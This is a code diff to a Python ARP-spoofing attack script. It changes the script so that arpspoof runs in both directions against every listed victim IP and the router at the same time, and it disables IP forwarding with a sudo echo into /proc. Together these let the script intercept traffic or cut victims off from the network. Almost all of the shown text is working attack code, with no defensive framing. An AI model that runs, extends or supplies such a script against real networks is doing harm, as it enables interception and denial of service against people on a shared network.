@@ -10,6 +10,7 @@ import threading
 interface = sys.argv[1]
 router_ip = sys.argv[2]
 victims = []
+threads = []
 
 
 class terminalThread(threading.Thread):
@@ -23,18 +24,15 @@ class terminalThread(threading.Thread):
 
 def attack(ips):
 	for ip in ips:
-		thr1 = terminalThread(f"arpspoof -i {interface} -t {ip} {router_ip}")
-		thr2 = terminalThread(f"arpspoof -i {interface} -t {router_ip} {ip}")
+		threads.append(terminalThread(f"arpspoof -i {interface} -t {ip} {router_ip}"))
+		threads.append(terminalThread(f"arpspoof -i {interface} -t {router_ip} {ip}"))
 
-		thr1.start()
-		thr2.start()
-
-		thr1.join()
-		thr2.join()
+	for th in threads:
+		th.start()
 
 
 def disable_ip_forward():
-	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+	os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 
 def scanner(ip):
